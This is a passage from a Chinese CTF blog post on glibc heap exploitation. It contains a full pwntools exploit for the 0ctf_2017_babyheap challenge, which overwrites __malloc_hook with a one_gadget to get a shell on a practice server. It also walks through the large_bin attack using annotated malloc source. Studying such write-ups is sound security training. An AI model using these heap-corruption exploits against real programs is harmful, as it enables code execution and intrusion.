<p>hook&#x3D;u64(p.recvuntil(b”\x7f”)[-6:].ljust(8,b”\x00”))-0x58-0x10<br>libc&#x3D;LibcSearcher(‘__malloc_hook’,hook)<br>libc_base&#x3D;hook-libc.dump(“__malloc_hook”)<br>print(hex(libc_base))</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4.最后把malloc_hook覆盖为system就可以了</span><br><span class="line"></span><br><span class="line">用Arbitrary Alloc找到合适的size</span><br><span class="line"></span><br><span class="line">并且计算出偏移</span><br><span class="line"></span><br><span class="line">![image-20251120203309866](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251120203309866.png)</span><br><span class="line"></span><br><span class="line">要伪造这个大小为0x70的chunk，并且有一个真实的0x60的fastbin的fd来放置它的位置</span><br><span class="line"></span><br><span class="line">这里用chunk4来提供这个原0x70的fastbin</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>add(0x60)<br>delet(4) #将0x80的块分成0x60在fastbin中，0x20在unsortedbin中<br>dbg()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20251120203810080](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251120203810080.png)</span><br><span class="line"></span><br><span class="line">之后改接下来的0x60的chunk为fake_chunk，并且把malloc——hook填充为one_gadget</span><br><span class="line"></span><br><span class="line">就是标准的Arbitrary Alloc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload &#x3D; p64(hook - 0x23)#改fd<br>edit(2,len(payload),payload)<br>add(0x60)<br>add(0x60)</p>
<p>payload &#x3D; b’a’*(3+0x10)<br>payload +&#x3D; p64(libc_base+0x4526a)<br>edit(6,len(payload),payload)<br>add(16)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>from pwn import *<br>import sys<br>from LibcSearcher import *</p>
<p>file_path &#x3D; “.&#x2F;0ctf_2017_babyheap”<br>remote_host &#x3D; “node5.buuoj.cn”<br>remote_port &#x3D; 29397<br>context(arch&#x3D;’amd64’, os&#x3D;’linux’, log_level&#x3D;’debug’)</p>
<p>context.terminal &#x3D; [<br>    “cmd.exe”, “&#x2F;c”,<br>    “start”, “&#x2F;max”, “”, “wt.exe”,<br>    “–profile”, “WSL GDB (Black)”,<br>    “–”, “wsl”, “bash”, “-lc”<br>]</p>
<p>elf &#x3D; ELF(file_path)<br>#libc &#x3D; elf.libc<br>if ‘re’ in sys.argv:<br>    p &#x3D; remote(remote_host, remote_port)<br>else:<br>    p &#x3D; process(file_path)<br>    #gdb.attach(p,”b*”)</p>
<p>def dbg():<br>    gdb.attach(p)<br>    pause()<br>def sla(a, b):<br>    p.sendlineafter(a, b)<br>def ru(a):<br>    p.recvuntil(a)<br>def sa(a, b):<br>    p.sendafter(a, b)</p>
<p>def add(size):<br>	p.recvuntil(“Command: “)<br>	p.sendline(str(1))<br>	p.recvuntil(“Size: “)<br>	p.sendline(str(size))</p>
<p>def edit(idx,size,content):<br>	p.recvuntil(“Command: “)<br>	p.sendline(str(2))<br>	p.recvuntil(“Index: “)<br>	p.sendline(str(idx))<br>	p.recvuntil(“Size: “)<br>	p.sendline(str(size))<br>	p.recvuntil(“Content: “)<br>	p.sendline(content)</p>
<p>def delet(idx):<br>	p.recvuntil(“Command: “)<br>	p.sendline(str(3))<br>	p.recvuntil(“Index: “)<br>	p.sendline(str(idx))</p>
<p>def show(idx):<br>	p.recvuntil(“Command: “)<br>	p.sendline(str(4))<br>	p.recvuntil(“Index: “)<br>	p.sendline(str(idx))</p>
<p>add(0x10)<br>add(0x10)<br>add(0x10)<br>add(0x10)<br>add(0x80)</p>
<p>delet(1)<br>delet(2)<br>#dbg()</p>
<p>pay&#x3D;p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)<br>edit(0,len(pay),pay)</p>
<p>pay&#x3D;p64(0)*3+p64(0x21)<br>edit(3,len(pay),pay)<br>#dbg()</p>
<p>add(0x10)<br>add(0x10)#2<br>#dbg()</p>
<p>pay&#x3D;b”a”*0x18+p64(0x91)<br>edit(3,len(pay),pay)<br>add(0x80)#避免top chunk合并<br>delet(4)<br>show(2)</p>
<p>hook&#x3D;u64(p.recvuntil(b”\x7f”)[-6:].ljust(8,b”\x00”))-0x58-0x10<br>libc&#x3D;LibcSearcher(‘__malloc_hook’,hook)<br>libc_base&#x3D;hook-libc.dump(“__malloc_hook”)<br>print(“malloc_hook:”+hex(hook))<br>print(hex(libc_base))<br>#dbg()</p>
<p>add(0x60)<br>delet(4) #将0x80的块分成0x60在fastbin中，0x20在unsortedbin中<br>#dbg()</p>
<p>payload &#x3D; p64(hook - 0x23)#改fd<br>edit(2,len(payload),payload)<br>add(0x60)<br>add(0x60)</p>
<p>payload &#x3D; b’a’*(3+0x10)<br>payload +&#x3D; p64(libc_base+0x4526a)<br>edit(6,len(payload),payload)<br>add(16)</p>
<p>p.interactive()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## large_bin</span><br><span class="line"></span><br><span class="line">64位是0x400字节    32位是最小0x200字节</span><br><span class="line"></span><br><span class="line">每个arena中放置不同大小的bin</span><br><span class="line"></span><br><span class="line">![image-20251124194559754](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251124194559754.png)</span><br><span class="line"></span><br><span class="line">`fd_nextsize/bk_nextsize` 构成一条**“按 size 去重后的有序索引链”**，是组之间的指针</span><br><span class="line"></span><br><span class="line">只有**每个 size 组的第一个 chunk（head）**会进 nextsize 链</span><br><span class="line"></span><br><span class="line">同 size 的其他 chunk：</span><br><span class="line"></span><br><span class="line">- 只用 fd/bk 挂在该 size 组旁边</span><br><span class="line">- 它们的 `fd_nextsize/bk_nextsize` 在不少版本里是 `0`（或不参与逻辑）</span><br><span class="line"></span><br><span class="line"> 从 `bin-&gt;fd` 往 `fd` 走，chunk size **越来越小**；</span><br><span class="line"></span><br><span class="line"> 从 `bin-&gt;bk` 往 `bk` 走，chunk size **越来越大**。</span><br><span class="line"></span><br><span class="line">![image-20251124174037146](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251124174037146.png)</span><br><span class="line"></span><br><span class="line">在同一组内</span><br><span class="line"></span><br><span class="line">和unsorted_bin的chunk相同，最先释放的chunk作为对应index的chunk的头节点，只有最开始的chunk的mextsize指针起作用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### large_bin attack </span><br><span class="line"></span><br><span class="line">源码分析（插入）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>else&#x2F;&#x2F;arena(av)》  bin头 &lt;-&gt; A(0x470) &lt;-&gt; B(0x460 head) &lt;-&gt; C(0x460) &lt;-&gt; D(0x450 head) &lt;-&gt; bin头<br>&#x2F;&#x2F;每个arena中还有一个nextsize链</p>
<pre><code>        &#123;//先定位 victim 属于哪个 largebin
          victim_index = largebin_index (size);
          bck = bin_at (av, victim_index);//bck 先指向 该 largebin 的 bin 头（哨兵，不是 chunk）
          fwd = bck-&gt;fd;//bin 头在 fd/bk 总链里指向的第一个 chunk（链首）A

          if (fwd != bck)
            &#123;
              size |= PREV_INUSE;
              assert (chunk_main_arena (bck-&gt;bk));//检查arena中的最小的chunk确实属于该arena
</code></pre>
<p>&#x2F;&#x2F;为arena中最小时<br>                  if ((unsigned long) (size)&lt; (unsigned long) chunksize_nomask (bck-&gt;bk))<br>                    {<br>                      fwd &#x3D; bck;<br>                      bck &#x3D; bck-&gt;bk;<br>                      &#x2F;&#x2F;改变 victim 在 nextsize 链中的前后指针<br>                      victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;<br>                    }<br>&#x2F;&#x2F;不是arena中最小的chunk时<br>                  else<br>                    {<br>                      assert (chunk_main_arena (fwd));<br>                      &#x2F;&#x2F;在 nextsize(head 链)里定位插入点 fwd<br>                      while ((unsigned long) size &lt; chunksize_nomask (fwd))&#x2F;&#x2F;一直跳到 第一个 size 不再大于 victim 的 head 为止<br>                        {<br>                          fwd &#x3D; fwd-&gt;fd_nextsize;<br>              assert (chunk_main_arena (fwd));<br>                        }</p>
<pre><code>                    //判断是否同 size → 决定“组内插入”还是“新建 head”
                  if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd))
                    fwd = fwd-&gt;fd;
                  else//新建，把victim插入到 fwd 前面
                    &#123;
                      victim-&gt;fd_nextsize = fwd;
                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
                      if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))
                        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);
                      fwd-&gt;bk_nextsize = victim;
                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
                    &#125;
                  bck = fwd-&gt;bk;
                  if (bck-&gt;fd != fwd)
                    malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);
                &#125;
            &#125;
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20251125100425363](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251125100425363.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**这 5 行是在“伪造 largebin 里 p2 的元数据”**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>p2[-1] &#x3D; 0x3f1;                      &#x2F;&#x2F; 伪造 p2.size 变小<br>p2[0] &#x3D; 0;                           &#x2F;&#x2F; 伪造 p2.fd<br>p2[2] &#x3D; 0;                           &#x2F;&#x2F; 伪造 p2.fd_nextsize<br>p2[1] &#x3D; (unsigned long)(&amp;stack_var1 - 2);  &#x2F;&#x2F; 伪造 p2.bk<br>p2[3] &#x3D; (unsigned long)(&amp;stack_var2 - 4);  &#x2F;&#x2F; 伪造 p2.bk_nextsize</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**此时 p2 是已经 free、并且已经在 largebin 里的 chunk。**</span><br><span class="line"> 你假设有漏洞能改它的头部指针，这 5 行就是“漏洞写出来的效果”。</span><br><span class="line"></span><br><span class="line">它们的目的只有三件事：</span><br><span class="line"></span><br><span class="line">1. **把 p2.size 改小**</span><br><span class="line">    → 让后面插入的大块 p3 变成“更大的新head”，走可利用分支</span><br><span class="line">2. **把 p2.bk 伪造成栈上 stack_var1 附近**</span><br><span class="line">    → 让插入时的 `bck-&gt;fd = victim` 写到 stack_var1</span><br><span class="line">3. **把 p2.bk_nextsize 伪造成栈上 stack_var2 附近**</span><br><span class="line">    → 让插入时的 `victim-&gt;bk_nextsize-&gt;fd_nextsize = victim` 写到 stack_var2</span><br><span class="line"></span><br><span class="line">`-2` 和 `-4` 是为了对齐字段偏移（fd 在 +0x10、fd_nextsize 在 +0x20）。</span><br><span class="line"></span><br><span class="line">**接下来的 `malloc(0x90)` 是触发点**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>malloc(0x90);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这次 malloc 并不是为了拿到 0x90 的块本身，而是为了让 glibc 做两件事：</span><br><span class="line"></span><br><span class="line">**整理 unsorted bin**</span><br><span class="line"></span><br><span class="line">在你前面的步骤里：</span><br><span class="line"></span><br><span class="line">- p3 free 过，当前在 **unsorted bin**</span><br><span class="line">- p2 已经在 **largebin**</span><br><span class="line"></span><br><span class="line">malloc 时 glibc 会扫描 unsorted，把其中的大块按规则搬去 small/large bins。</span><br><span class="line"></span><br><span class="line">**把 p3 插入 largebin**</span><br><span class="line"></span><br><span class="line">因为 p3 是大块，最终会被当作 **victim** 插入 largebin。</span><br><span class="line"></span><br><span class="line">此时 largebin 里有一个“被你改小 size 的 p2”，</span><br><span class="line"> 所以对 glibc 来说：</span><br><span class="line"></span><br><span class="line">- p2 看起来更小</span><br><span class="line">- p3 看起来更大</span><br><span class="line">   → p3 插入时走 **“新size组head插入nextsize链”的分支**</span><br><span class="line"></span><br><span class="line">这会必然触发两处写。</span><br><span class="line"></span><br><span class="line">**写点①：覆盖 stack_var2**</span><br><span class="line"></span><br><span class="line">largebin 插入新 head 时会执行：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">你伪造了：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>victim-&gt;bk_nextsize &#x3D; p2-&gt;bk_nextsize &#x3D; &amp;stack_var2 - 4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">所以这句变成：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>(&amp;stack_var2 - 4)-&gt;fd_nextsize &#x3D; victim</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">而 `fd_nextsize` 字段恰好是偏移 0x20（=4个qword），</span><br><span class="line"> 于是**正好写到 stack_var2 上**：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>stack_var2 &#x3D; victim (&#x3D; p3的chunk地址)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**写点②：覆盖 stack_var1**</span><br><span class="line"></span><br><span class="line">同一次插入还会执行总链回填：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>bck &#x3D; fwd-&gt;bk;     &#x2F;&#x2F; fwd 会落在 p2 附近<br>bck-&gt;fd &#x3D; victim;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">你伪造了：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>fwd-&gt;bk &#x3D; p2-&gt;bk &#x3D; &amp;stack_var1 - 2<br>&#x3D;&gt; bck &#x3D; &amp;stack_var1 - 2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">于是：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>(&amp;stack_var1 - 2)-&gt;fd &#x3D; victim</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`fd` 字段偏移是 0x10（=2个qword），</span><br><span class="line"> 所以**正好写到 stack_var1 上**：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>stack_var1 &#x3D; victim (&#x3D; p3的chunk地址)</p>
<pre><code>
![image-20251125100940754](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251125100940754.png)
</code></pre>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/heap/">heap</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                            <div class="post-share-container border-box">
    <ul class="share-list-wrap border-box">
        <li class="qq share-item border-box flex-center tooltip"
            data-tooltip-content="Share to QQ"
        >
            <i class="fa-brands fa-qq"></i>
        </li>
        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
            data-tooltip-content="Share to WeChat"
            data-tooltip-img-tip="Scan by WeChat"
            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
        >
            <i class="fa-brands fa-weixin"></i>
        </li>
        <li class="weibo share-item border-box flex-center tooltip"
            data-tooltip-content="Share to WeiBo"
        >
            <i class="fa-brands fa-weibo"></i>
        </li>
    </ul>
</div>

                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2025/11/24/RCTF/"
                                   title="RCTF"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">RCTF</span>
                                        <span class="post-nav-item">Prev posts</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2025/10/23/Unlink/"
                                   title="Unlink"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">Unlink</span>
                                        <span class="post-nav-item">Next posts</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-attack"><span class="nav-number">1.</span> <span class="nav-text">fastbin_attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#double-free"><span class="nav-number">1.1.</span> <span class="nav-text">double_free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-consolidate"><span class="nav-number">1.2.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-into-stack-Arbitrary-Alloc"><span class="nav-number">1.3.</span> <span class="nav-text">fastbin_dup_into_stack&amp;&amp;Arbitrary Alloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Spirit"><span class="nav-number">1.4.</span> <span class="nav-text">House of Spirit</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
    
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">zach0ry</a>
        
    </div>

    <div class="theme-info info-item">
        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    

    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-attack"><span class="nav-number">1.</span> <span class="nav-text">fastbin_attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#double-free"><span class="nav-number">1.1.</span> <span class="nav-text">double_free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-consolidate"><span class="nav-number">1.2.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-dup-into-stack-Arbitrary-Alloc"><span class="nav-number">1.3.</span> <span class="nav-text">fastbin_dup_into_stack&amp;&amp;Arbitrary Alloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#House-of-Spirit"><span class="nav-number">1.4.</span> <span class="nav-text">House of Spirit</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->

    
<script src="/js/local-search.js"></script>



<!-- lazyload -->


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        
            
<script src="/js/post/toc.js"></script>

        

        <!-- copyright-info -->
        

        <!-- share -->
        
            
<script src="/js/post/share.js"></script>

        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
